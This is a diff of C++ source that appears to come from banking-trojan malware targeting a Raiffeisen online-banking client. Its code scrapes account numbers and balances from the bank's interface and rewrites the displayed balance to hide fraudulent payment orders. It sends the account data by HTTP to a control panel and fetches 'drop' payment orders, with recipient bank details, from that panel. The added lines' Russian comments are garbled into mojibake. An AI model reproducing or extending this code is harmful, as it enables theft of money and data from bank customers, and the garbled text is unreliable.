+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅ format = 1, пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ , пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ, 
+//пїЅпїЅпїЅпїЅ = 2, пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, 4 - пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 static char* IntToBalans( int v, char* s, int format )
 {
 	int len = 0;
 	char* p = s;
-	while( v != 0 || ((format & 2) == 0 && len < 4) ) //копейки с точкой обязательно нужно, делаем минимум текст с форматом 0.00
+	while( v != 0 || ((format & 2) == 0 && len < 4) ) //пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ 0.00
 	{
 		*p++ = (v % 10) + '0';
 		len++;
 		v /= 10;
 		if( (format & 2) == 0 )
 		{
-			if( len == 2 ) //отделяем копейки точкой
+			if( len == 2 ) //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 			{
 				*p++ = '.';
 				len++;
@@ -1927,7 +1938,7 @@ static char* IntToBalans( int v, char* s, int format )
 	    }
 	}
 	*p = 0;
-	//переворачиваем число
+	//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 	for( int i = 0; i < len / 2; i++ )
 	{
 		char c = s[i];
@@ -1938,7 +1949,7 @@ static char* IntToBalans( int v, char* s, int format )
 	{
 		len--;
 		while( s[len] == '0' ) len--;
-		if( s[len] == '.' ) //0 копеек, только рубли (остается целая часть)
+		if( s[len] == '.' ) //0 пїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ (пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ)
 			s[len] = 0;
 		else
 			s[len + 1] = 0;
@@ -1946,21 +1957,21 @@ static char* IntToBalans( int v, char* s, int format )
 	return s;
 }
 
-//добавляет найденные балансы и считает баланс с учетом введенных платежек
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 static char* AddBalans( const char* acc, const char* balans )
 {
 	int i;
 	for( i = 0; i < c_findedBalans; i++ )
 		if( m_lstrcmp( findedBalans[i].acc, acc ) == 0 )
 			break;
-	if( i >= c_findedBalans ) //новый счет
+	if( i >= c_findedBalans ) //пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 	{
-		if( c_findedBalans >= 8 ) return 0; //рассчитано на не более 8-ми счетов
+		if( c_findedBalans >= 8 ) return 0; //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ 8-пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 		m_lstrcpy( findedBalans[i].acc, acc );
 		c_findedBalans++;
 	}
 	m_lstrcpy( findedBalans[i].balans, balans );
-	//считаем баланс для отображения
+	//пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	int intBalans = BalansToInt(balans);
 	int oldBalans = intBalans;
 	for( int i = 0; i < c_paymentOrders; i++ )
@@ -1969,7 +1980,7 @@ static char* AddBalans( const char* acc, const char* balans )
 		{
 			int intBalans2 = BalansToInt(paymentOrders[i].balans);
 			DBGRAFA( "Rafa", "balans: %d %d", intBalans < intBalans2 );
-			if( intBalans < intBalans2 ) //настоящий баланс меньше, чем тот что был в момент создания платежки
+			if( intBalans < intBalans2 ) //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 			{
 				int intSum = BalansToInt(paymentOrders[i].sum);
 				intBalans += intSum;
@@ -1977,43 +1988,43 @@ static char* AddBalans( const char* acc, const char* balans )
 		}
 	}
 	IntToBalans( intBalans, findedBalans[i].showBalans );
-	if( intBalans != oldBalans ) //подменили баланс
+	if( intBalans != oldBalans ) //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 		SendLogToAdminThread(5);
 	DBGRAFA( "Rafa", "finded acc '%s', balans '%s', show balans '%s'", acc, balans, findedBalans[i].showBalans );
 	return findedBalans[i].showBalans;
 }
 
-//грабим баланс с текстового поля (справа снизу)
-//грабим с такой строки:
-//Доступный/текущий остаток по счету: 83109.16/83109.16 (РОССИЙСКИЙ РУБЛЬ)
+//пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ (пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ)
+//пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ:
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ/пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ: 83109.16/83109.16 (пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ)
 static void GrabBalansFromMemoText(char* s)
 {
-	char* p = m_strstr( s, "(РОССИЙСКИЙ РУБЛЬ)" );
+	char* p = m_strstr( s, "(пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ)" );
 	if( p )
 	{
-		p--; //становимся перед найденной фразой, там должен быть пробел, игнорируем его
+		p--; //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ
 		while( *p == ' ' && p >= s ) p--;
 		if( p > s )
 		{
-			//стоим на последней цифре баланса, идем назад пока не найдем пробел, т. е. переходим на начало баланса
+			//пїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ, пїЅ. пїЅ. пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 			char* p1 = p;
-			char* end = p; //конец позиции баланса для его подмены
+			char* end = p; //пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 			while( *p1 != ' ' && p1 >= s ) p1--;
 			if( p1 > s )
 			{
-				p1++; //стоим на 1-й цифре первой суммы
-				char* beg = p1; //начало позиции баланса для его подмены
+				p1++; //пїЅпїЅпїЅпїЅпїЅ пїЅпїЅ 1-пїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
+				char* beg = p1; //пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 				if( *p1 >= '0' && *p1 <= '9' )
 				{
 					char acc[32], balans[32];
-					//переносим цифры до точки (целую часть)
+					//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ (пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ)
 					int i = 0;
 					//while( *p1 != '.' && p1 > s && i < sizeof(balans) - 1 ) balans[i++] = *p1++;
 					while( *p1 != '/' && *p1 != ' ' && p1 > s && i < sizeof(balans) - 1 ) balans[i++] = *p1++;
-					balans[i] = 0; //теперь у нас там остаток
-					//ищем номер счета
-					//он должен быть в в фомате: "Счет N: 28462985925292987927923;"
-					p = m_strstr( s, "Счет N:" );
+					balans[i] = 0; //пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+					//пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
+					//пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ: "пїЅпїЅпїЅпїЅ N: 28462985925292987927923;"
+					p = m_strstr( s, "пїЅпїЅпїЅпїЅ N:" );
 					if( p )
 					{
 						p += 7;
@@ -2022,20 +2033,20 @@ static void GrabBalansFromMemoText(char* s)
 						while( *p >= '0' && *p <= '9' ) acc[i++] = *p++;
 						acc[i] = 0;
 						char* showBalans = AddBalans( acc, balans );
-						if( showBalans ) //подменяем баланс
+						if( showBalans ) //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 						{
-							int ls = m_lstrlen(s); //длина сообщения
-							int lb = end - beg + 1; //длина реального баланса (их там два числа)
-							int lp = m_lstrlen(showBalans); //длина подменяемого баланса (одно число)
-							int d = 2 * lp + 1 - lb; //на сколько изменится длина сообщения (2 * lp + 1 - две суммы и знак /)
-							if( d > 0 ) //длина увеличилась, сдвигаем вправо все что после end
+							int ls = m_lstrlen(s); //пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+							int lb = end - beg + 1; //пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ (пїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ)
+							int lp = m_lstrlen(showBalans); //пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ (пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ)
+							int d = 2 * lp + 1 - lb; //пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ (2 * lp + 1 - пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅ /)
+							if( d > 0 ) //пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ end
 							{
 								p = s + ls - 1;
 								while( p > end ) { p[0] = p[-d]; p--; }
 							}
-							if( d < 0 ) //длина уменьшилась, сдвигаем влево все что после end
-								m_memcpy( end + d, end, ls - (end - s + 1) + 1 ); //конечный 0 тоже перемещаем
-							//вставляем новый баланс
+							if( d < 0 ) //пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ end
+								m_memcpy( end + d, end, ls - (end - s + 1) + 1 ); //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ 0 пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+							//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 							m_memcpy( beg, showBalans, lp );
 							beg[lp] = '/';
 							m_memcpy( beg + lp + 1, showBalans, lp );
@@ -2047,7 +2058,7 @@ static void GrabBalansFromMemoText(char* s)
 	}
 }
 
-//грабит баланс с таблицы справа сверху
+//пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 void GrabBalansFromLVM( int cln, char* s )
 {
 	if( cln == 1 && s[0] >= '0' && s[1] <= '9' )
@@ -2061,19 +2072,19 @@ void GrabBalansFromLVM( int cln, char* s )
 	}
 	if( cln == 2 && fromLVM == 0 )
 	{
-		if( m_lstrcmp( s, "РОССИЙСКИЙ РУБЛЬ" ) == 0 ) //нужное значение ячейки, следующая ячейка будет иметь баланс
+		if( m_lstrcmp( s, "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ" ) == 0 ) //пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 		{
 			fromLVM = 1;
 		}
 	}
 	else
-		if( (cln == 3 || cln == 4) && fromLVM > 0 ) //в s находится баланс
+		if( (cln == 3 || cln == 4) && fromLVM > 0 ) //пїЅ s пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 		{
 			if( *s >= '0' && *s <= '9' )
 			{
 				char balans[32];
 				int i = 0;
-				//переносим цифры до точки
+				//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 				//while( *s && *s != '.' && i < sizeof(balans) - 1 ) balans[i++] = *s++;
 				//balans[i] = 0;
 				m_lstrcpy( balans, s );
@@ -2088,7 +2099,7 @@ void GrabBalansFromLVM( int cln, char* s )
 //http://sberbanksystem.ru/bal/?uid=TEST0123456789&type=raifur&sum=234234
 
  
-//загрузка проведенных платежек из файла, чтобы их потом скрывать
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 static void LoadPaymentOrders()
 {
 	if( !File::IsExists(filePayments) ) return;
@@ -2098,21 +2109,21 @@ static void LoadPaymentOrders()
 	pReadFile( file, &c_paymentOrders, sizeof(c_paymentOrders), &rl, 0 );
 	for(;;)
 	{
-		if( c_paymentOrders > 0 && c_paymentOrders < 10 ) //количество в разумных пределах, иначе возможно читаем плохой файл
+		if( c_paymentOrders > 0 && c_paymentOrders < 10 ) //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 		{
 			char* base;
-			pReadFile( file, &base, sizeof(&base), &rl, 0 ); //читаем базовый адрес, для вычисления правильных адресов в структуре
+			pReadFile( file, &base, sizeof(&base), &rl, 0 ); //пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 			int sz = c_paymentOrders * sizeof(PaymentOrder);
 			paymentOrders = (PaymentOrder*)MemAlloc(sz);
 			if( paymentOrders )
 			{
 				pReadFile( file, paymentOrders, sz, &rl, 0 );
-				if( rl == sz ) //прочли столько сколько надо
+				if( rl == sz ) //пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 				{
 					RelocPayment(base);
 					for( int i = 0; i < c_paymentOrders; i++ )
 					{
-						DBGRAFA( "Rafa", "Считанная платежка:" );
+						DBGRAFA( "Rafa", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ:" );
 						DBGPrintPayment(&paymentOrders[i]);
 					}
 					break;
@@ -2125,7 +2136,7 @@ static void LoadPaymentOrders()
 	pCloseHandle(file);
 }
 
-//сохранение платежек
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 static void SavePaymentOrders() 
 {
 	if( c_paymentOrders == 0 ) return;
@@ -2133,18 +2144,18 @@ static void SavePaymentOrders()
 	if( file == INVALID_HANDLE_VALUE ) return;
 	DWORD rl;
 	pWriteFile( file, &c_paymentOrders, sizeof(c_paymentOrders), &rl, 0 ); 
-	//сохраняем базовый адрес массива, чтобы потом восстановить указатели в структуре
+	//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	pWriteFile( file, &paymentOrders, sizeof(&paymentOrders), &rl, 0 ); 
 	pWriteFile( file, paymentOrders, sizeof(PaymentOrder) * c_paymentOrders, &rl, 0 );
 	pCloseHandle(file);
 }
 
-//отсылка Get запроса админке, если ret = true, то нужно возвращать ответ
-//mode1 - текст команды для одного баланса, mode2 - текст команды для нескольких балансов
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅ Get пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅ ret = true, пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
+//mode1 - пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ, mode2 - пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 static char* SendToAdmin( const char* mode1, const char* mode2, bool ret )
 {
 	char urlAdmin[128];
-	if( c_findedBalans == 0 ) return 0; //если аккаунты не обнаружены, то не смысла слать запрос
+	if( c_findedBalans == 0 ) return 0; //пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	char* res = 0;
 //	if( GetAdminUrl(urlAdmin) )
 	{
@@ -2152,7 +2163,7 @@ static char* SendToAdmin( const char* mode1, const char* mode2, bool ret )
 		fwsprintfA pwsprintfA = Get_wsprintfA();
 		MemPtr<512> qr, accs;
 		MemPtr<128> uid;
-		//формируем строку с балансами
+		//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		if( c_findedBalans > 1 )
 		{
 			m_lstrcpy( accs.str(), "accs=" );
@@ -2163,15 +2174,15 @@ static char* SendToAdmin( const char* mode1, const char* mode2, bool ret )
 		}
 		else
 			pwsprintfA( accs.str(), "sum=%s&acc=%s", findedBalans[0].balans, findedBalans[0].acc );
-		//формируем запрос
+		//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 		GenerateUid(uid.str());
 		string azUser = GetAzUser();
 		pwsprintfA( qr.str(), "http://%s/raf/?uid=%s&sys=raifur&cid=%s&mode=%s&%s", urlAdmin, uid, azUser.t_str(), mode, accs.str() );
-		//отправляем запрос
+		//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 		THTTPResponseRec Response;
 		ClearStruct(Response);
 		HTTP::Get( qr, ret ? &res : 0, &Response );
-		DBGRAFA( "Rafa", "Передали запрос: %s", qr.str() );
+		DBGRAFA( "Rafa", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ: %s", qr.str() );
 		HTTPResponse::Clear(&Response);
 	}
 	if( res )
@@ -2179,12 +2190,12 @@ static char* SendToAdmin( const char* mode1, const char* mode2, bool ret )
 		char* res2 = UTF8ToAnsi(res);
 		STR::Free(res);
 		res = res2;
-		DBGRAFA( "Rafa", "Получен ответ: %s", res );
+		DBGRAFA( "Rafa", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ: %s", res );
 	}
 	else
 		if( ret )
 		{
-			DBGRAFA( "Rafa", "Ответа нет" );
+			DBGRAFA( "Rafa", "пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ" );
 		}
 	return res;
 }
@@ -2192,22 +2203,22 @@ static char* SendToAdmin( const char* mode1, const char* mode2, bool ret )
 static char* CopyDataPayment( char*& to, char* from )
 {
 	while( *from != '|' && *from ) *to++ = *from++;
-	if( *from == '|' ) from++; //переход на следующий параметр
+	if( *from == '|' ) from++; //пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	*to++ = 0;
 	return from;
 }
 
-//запрос новой платежки в админке
+//пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 static PaymentOrder* GetPaymentOrders()
 {
 	char* payment = SendToAdmin( "getdrop", "getdrops", true );
 	PaymentOrder* res = 0;
 	if( payment )
 	{
-		//если уже есть платежки, то перевыделяем память для новой платежки
+		//пїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		if( c_paymentOrders > 0 )
 		{
-			char* base = (char*)paymentOrders; //после перевыделения памяти. необходимо пересчитать адреса для новой памяти
+			char* base = (char*)paymentOrders; //пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ. пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 			paymentOrders = (PaymentOrder*)MemRealloc( paymentOrders, sizeof(PaymentOrder) * (c_paymentOrders + 1) );
 			if( paymentOrders ) 
 			{
@@ -2217,14 +2228,14 @@ static PaymentOrder* GetPaymentOrders()
 			else
 				c_paymentOrders = 0;
 		}
-		else //платежек еще не было, создаем
+		else //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		{
 			paymentOrders = (PaymentOrder*)MemAlloc( sizeof(PaymentOrder) );
 			if( paymentOrders ) c_paymentOrders++;
 		}
 		if( c_paymentOrders > 0 )
 		{
-			//разбор переданной строки
+			//пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 			PaymentOrder* po = &paymentOrders[c_paymentOrders - 1];
 			char* from = payment;
 			char* to = po->mem;
@@ -2242,7 +2253,7 @@ static PaymentOrder* GetPaymentOrders()
 			po->bankCity = to; from = CopyDataPayment( to, from );
 			po->bankAcc = to; from = CopyDataPayment( to, from );
 			po->entered = false;
